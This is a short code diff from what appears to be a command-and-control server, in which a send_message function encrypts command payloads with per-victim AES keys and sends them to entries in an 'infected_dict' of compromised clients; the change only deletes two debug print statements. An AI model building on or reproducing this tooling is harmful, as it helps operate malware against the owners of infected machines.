@@ -235,8 +235,6 @@ def send_message(message, infected_dict):
             # Send the length header followed by the exact command payload
             # expected by the client's receive loop.
             try:
-                print(infected_dict[target])
-                print(infected_dict[target][0])
                 encrypted_mess = aes_encrypt(infected_dict[target][2], final_mess)
                 infected_dict[target][0].send(header + encrypted_mess)
             except Exception as e:
